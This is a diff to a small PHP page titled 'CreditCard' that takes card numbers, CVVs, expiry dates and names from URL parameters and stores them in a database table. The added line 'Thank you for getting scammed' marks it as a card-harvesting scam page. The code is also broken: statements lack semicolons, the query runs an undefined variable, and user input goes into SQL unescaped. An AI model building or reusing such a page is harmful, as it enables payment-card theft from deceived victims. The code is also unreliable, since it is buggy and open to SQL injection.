@@ -3,9 +3,8 @@
 <head>
 <title>CreditCard</title>
 
+    <p>Thank you for getting scammed</p>
 
-
-        <div class="centerref">
                 <?php
                     $servername = "localhost";
                     $username = "php";
@@ -18,6 +17,8 @@
                     $emonth = ($_GET['ExpiryMonth'])
                     $eyear = ($_GET['ExpiryYear'])
 
+                        $CC = htmlspecialchars($_GET['CardNumber']);
+                        echo $CC 
 
                             // Create connection
                             $conn = new mysqli($servername, $username, $password, $dbname);
@@ -26,7 +27,7 @@
                             {
                                 die("Connection failed: " . $conn->connect_error);
                             }
-                            $sql_insert= "INSERT INTO ccinfo (firstname, lastname, creditcard,CVV,'month','year') VALUES ($firstname,$lastname,$CC,$CVV,$emonth,$eyear);";
+                            $sql_insert= "INSERT INTO ccinfo (firstname, lastname, creditcard, cvv, month, year) VALUES ($firstname,$lastname,$CC,$CVV,$emonth,$eyear);";
                             if ($conn->query($sql) === TRUE) 
                             {
                                 echo "New record created successfully";
@@ -36,5 +37,4 @@
 
                     $conn->close();
                 ?> 
-        </div> 
 </html>
